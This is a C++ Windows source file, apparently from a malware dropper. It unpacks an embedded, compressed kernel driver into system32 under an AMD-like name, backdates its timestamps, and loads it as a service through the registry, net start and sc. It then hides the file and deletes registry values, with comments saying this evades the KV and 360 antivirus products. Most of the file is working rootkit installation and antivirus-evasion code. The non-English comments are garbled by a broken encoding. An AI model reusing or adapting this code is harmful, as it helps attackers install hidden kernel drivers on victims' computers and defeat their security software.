#include <Windows.h>
#include "appack.cpp"

#pragma comment(lib,"aplib.lib")

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	char	strTmpPath[MAX_PATH];
	char	strBinPath[MAX_PATH];
	char	lpOutput[MAX_PATH];

	// һ��Ҫ��������ֿ���GetTickCount�п��ܵõ�һ����ֵ
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\\%d_res.tmp", strTmpPath, GetTickCount());
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "FindResource Error:%d",GetLastError());
		OutputDebugString(lpOutput);
		return FALSE;
	}
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "LoadResource Error:%d",GetLastError());
		OutputDebugString(lpOutput);
		return FALSE;
	}
	hFile = CreateFile
		(
		strBinPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		memset(lpOutput,0,sizeof(lpOutput));
		wsprintf(lpOutput, "CreateFile Error:%d",GetLastError());
		OutputDebugString(lpOutput);
		return FALSE;
	}

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);

	WriteFile(hFile, hRes, SizeofResource(hModule, hResInfo), &dwBytes, NULL);  //ע��SizeofResource�ĵ�һ������Ҫ�������Ȼ�������ļ���0�ֽ�
	// д������
	if (lpConfigString != NULL)
	{
		WriteFile(hFile, lpConfigString, lstrlen(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	FreeResource(hRes);
	
	// Fuck KV File Create Monitor
	MoveFile(strBinPath, lpFileName);
	//SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(strBinPath);
	return TRUE;
}
void RunAProcess(char *comline)
{
	STARTUPINFO   si;   
	memset(&si,0 ,sizeof(STARTUPINFO));   
	si.cb   =   sizeof(   STARTUPINFO   );   
	si.dwFlags   =   STARTF_USESHOWWINDOW;   
	si.wShowWindow   =   SW_SHOW;   
	PROCESS_INFORMATION   pi;   
	CreateProcess(NULL,comline,   NULL,   NULL,   FALSE,   CREATE_NO_WINDOW,   NULL,   NULL,   &si,   &pi);  //��������������

	//------------------------------------------------------------------------------------------------------Ҫɾ��ImagePath�����ֵ����Ȼ������360
	WaitForSingleObject(pi.hProcess, INFINITE);  //�ȴ��ź�ִ�н���
	return;
}
BOOL _RegSetValue(char *lpszKey,char *lpszValueName,char *lpszValue,int dwValueType,int dwSize)
{
	HKEY	hKey;

	if (RegCreateKey(HKEY_LOCAL_MACHINE,lpszKey,&hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey,lpszValueName,NULL,dwValueType,(const BYTE *)lpszValue,dwSize);
		RegCloseKey(hKey);
	}else{
		return FALSE;
	}
	return TRUE;
}
BOOL CheckDriverInstall()
{
	HANDLE hDevicehand;

	hDevicehand = CreateFile("\\\\.\\Protection",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hDevicehand==INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	return TRUE;
}
DWORD InstallDriverFormServices(SC_HANDLE hSCManager,LPSTR lpServicesName ,LPSTR path,BOOL hCheck)
{
	SC_HANDLE hService;
	DWORD Status=1;
	
	hService=CreateService(hSCManager,
						lpServicesName,
						lpServicesName,
						SERVICE_ALL_ACCESS,
						SERVICE_KERNEL_DRIVER,
						SERVICE_DEMAND_START,
						SERVICE_ERROR_NORMAL,
						path,
						NULL,
						NULL,
						NULL,
						NULL,
						NULL);
	if(hService==NULL)
	{
		printf("Error with CreateService: %d\n", GetLastError());
		Status=0;
		goto cleanup;
	}
	if (hCheck == FALSE)
	{
		goto cleanup;
	}
	if(StartService(hService, 0, NULL)==0)
	{
	 	printf("Error with StartService: %d\n", GetLastError());
	 	Status=0;
		goto cleanup;
	}
	
	cleanup:
	
	if(hService)
		CloseServiceHandle(hService);
	
	return Status;
}
void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL == hSCManager )
	{
		//OutputDebugToFile("OpenSCManager error:%d\r\n",GetLastError());
		return;
	}
	SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
	if ( NULL == hService )
	{
		//OutputDebugToFile("OpenService error:%d\r\n",GetLastError());
		return;
	}
	StartService(hService, 0, NULL);
	CloseServiceHandle( hService );
	CloseServiceHandle( hSCManager );
}
void InstallDriver(HMODULE hModule)
{

	char szDriverPath[256]={0};
	char szPackPath[256]={0};
	char szComLine[256]={0};
	char lpExpand[256]={0};
	char szFilePack[256]={0};
	char szUnFilePack[256]={0};

	char lpFilePath[256] = {0};
	WIN32_FIND_DATA lpFindData;

	GetWindowsDirectory(lpFilePath,sizeof(lpFilePath));
	lstrcat(lpFilePath,"\\system32\\_amdevntas.sys");
	memset(&lpFindData,0,sizeof(lpFindData));
	if (FindFirstFile(lpFilePath,&lpFindData) == INVALID_HANDLE_VALUE) //�ļ�������,
	{
		memset(szPackPath,0,sizeof(szPackPath));
		GetWindowsDirectory(szPackPath,sizeof(szPackPath));
		lstrcat(szPackPath,"\\amdevntas.temp");    //��������ɱ����
		//DeleteFile(szPackPath);
		ReleaseResource(hModule, 1122, "BIN", szPackPath,NULL); //�ͷ���������ɱ����
		
		memset(szDriverPath,0,sizeof(szDriverPath));
		GetWindowsDirectory(szDriverPath,sizeof(szDriverPath));
		lstrcat(szDriverPath,"\\system32\\_amdevntas.sys");    //��������ɱ����
		
		memset(szComLine,0,sizeof(szComLine));
		memset(lpExpand,0,sizeof(lpExpand));
		
		//GetWindowsDirectory(lpExpand,sizeof(lpExpand));
		//lstrcat(lpExpand,"\\system32\\expand.exe");
		//wsprintf(szComLine,"%s %s %s",lpExpand,szPackPath,szDriverPath);
		//RunAProcess(szComLine);
		
		decompress_file(szPackPath,szDriverPath);

		//OutputDebugString(szComLine);
		DeleteFile(szPackPath);
	}

	if (_RegSetValue("SYSTEM\\CurrentControlSet\\Services\\PDCOMP","ImagePath","system32\\_amdevntas.sys",REG_EXPAND_SZ,strlen("system32\\_amdevntas.sys")) == FALSE)
	{
		OutputDebugString("RegSetValue DllName failed");
	}

	RunAProcess("net start PDCOMP");
	if (CheckDriverInstall() == FALSE)
	{
		//OutputDebugToFile("Driver load error by net.exe\r\n");
		StartService("PDCOMP");
		if (CheckDriverInstall() == TRUE)
		{
			//OutputDebugToFile("Driver load ok by sc\r\n");
		}else
		{
			SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
			if ( NULL == hSCManager )
			{
				OutputDebugString("OpenSCManager1 error\r\n");
				return;
			}
			RunAProcess("sc delete PDCOMPB");
			InstallDriverFormServices(hSCManager,"PDCOMPB",szDriverPath,TRUE);
			if (CheckDriverInstall() == FALSE)
			{
				return;
			}
		}
	}

	SetFileAttributes(lpFilePath,FILE_ATTRIBUTE_HIDDEN);  //�����ļ�����

	//ɾ��ע�������360��ɱ
	HKEY	hKey0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\PDCOMP",NULL,\
		KEY_WRITE,&hKey0) == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey0,"ImagePath");
		RegCloseKey(hKey0);
	}
 
	return;
}